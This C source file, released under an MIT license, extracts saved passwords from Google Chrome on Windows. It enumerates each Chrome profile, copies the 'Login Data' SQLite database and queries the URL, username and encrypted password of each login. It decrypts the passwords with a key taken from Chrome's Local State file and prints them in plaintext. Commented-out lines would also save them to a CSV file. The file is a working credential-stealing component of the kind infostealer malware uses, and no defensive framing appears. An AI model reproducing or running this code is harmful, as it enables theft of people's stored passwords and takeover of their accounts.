/*
  Copyright (c) 2023 Shoaib Hassan

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
*/


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sqlite3.h>
#include "../Include/Decrypter.h"
#include "../Include/GetSecretKey.h"
#include "../Include/GetDbData.h"
int copyFile(const char* sourcePath, const char* destinationPath);
sqlite3* getDBConnection(const char* chromePathLoginDB);
int copyFile(const char* sourcePath, const char* destinationPath) {
	FILE* sourceFile = fopen(sourcePath, "rb");
	FILE* destinationFile = fopen(destinationPath, "wb");

	if (sourceFile == NULL || destinationFile == NULL) {
		perror("Error opening file");
		return 1;
	}

	char buffer[4096];
	size_t bytesRead;

	while ((bytesRead = fread(buffer, 1, sizeof(buffer), sourceFile)) > 0) {
		fwrite(buffer, 1, bytesRead, destinationFile);
	}

	fclose(sourceFile);
	fclose(destinationFile);

	return 0;
}
sqlite3* getDBConnection(const char* chromePathLoginDB) {
	char destinationPath[MAX_PATH_LENGTH] = "Loginvault.db";


	// Copy the Chrome database to a local file
	if (copyFile(chromePathLoginDB, destinationPath) != 0) {
		fprintf(stderr, "[ERR] Chrome database cannot be found\n");
		return NULL;
	}

	// Open a connection to the local database
	sqlite3* dbConnection;
	if (sqlite3_open(destinationPath, &dbConnection) != SQLITE_OK) {
		fprintf(stderr, "[ERR] Unable to open database: %s\n", sqlite3_errmsg(dbConnection));
		return NULL;
	}
	return dbConnection;
}


void GetDbData() {
	char UserDataPath[MAX_PATH_LENGTH],LocalStatePath[MAX_PATH_LENGTH];
	CHROME_PATH_LOCAL_STATE(LocalStatePath);
	CHROME_PATH(UserDataPath);
	DATA_BLOB SecretKey;
	
	WIN32_FIND_DATAA findFileData;
	char path[MAX_PATH_LENGTH];
	sprintf(path,"%s\\*",UserDataPath);
	
	GetSecretKey(LocalStatePath, &SecretKey);
	// FILE * out;
	// for(int i = 0;i < 100;i++){
	// 	char nme[16];
	// 	sprintf(nme,"Passwords%d.csv",i);
	// 	out = fopen(nme,"r");
								
	// 	if(out == NULL) {
	// 		out = fopen(nme,"w");
	// 		fputs("URL,Username,Password",out);
	// 		printf("Saving\n");
	// 		break;
	// 		}
								
	// }
	HANDLE hFind = FindFirstFileA(path, &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		perror("Error opening Chrome User Data directory");
		exit(EXIT_FAILURE);
	}
	do {
		if (strstr(findFileData.cFileName, "Profile ") != NULL || strstr(findFileData.cFileName, "Default") != NULL)  {
			// Found a matching folder (Profile* or Default)
			char loginDataPath[MAX_PATH_LENGTH];
			snprintf(loginDataPath, MAX_PATH_LENGTH,
			         "%s\\%s\\Login Data", UserDataPath, findFileData.cFileName);

			

			sqlite3* conn = getDBConnection(loginDataPath);

			if (conn != NULL) {

				sqlite3_stmt *stmt;
				const char *query = "SELECT action_url, username_value, password_value FROM logins";
				
				if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
					int result;
					
					while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
						const char *url 		= (const char *)sqlite3_column_text(stmt, 0);
						const char *username 	= (const char *)sqlite3_column_text(stmt, 1);
						BYTE  *ciphertext 		= (BYTE *)sqlite3_column_blob(stmt, 2);
						int bytes 				= sqlite3_column_bytes(stmt, 2);
						if(strcmp(url, "") && strcmp(username, "")  && memcmp(ciphertext,"",1)) {
							DATA_BLOB cipher = (DATA_BLOB) {bytes,ciphertext};
							printf(

								"URL: %s\n"
								"Username: %s\n"
								"Password: %s\n\n",
								url, username, DecryptPassword(cipher,SecretKey)
							);
							
						// 	fputs(url,out);fputs(",",out);fputs(username,out);
						// 	fputs(",",out);fputs(DecryptPassword(cipher,SecretKey),out);
						// } 
						}
					}
					sqlite3_finalize(stmt);
				} else {
					fprintf(stderr, "Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
				}
			} // If connection established
		} // Filtering only user profiles
	} while (FindNextFileA(hFind, &findFileData) != 0); 	// Get user profiles all
//	if(out != NULL) fclose(out);
	FindClose(hFind);
}
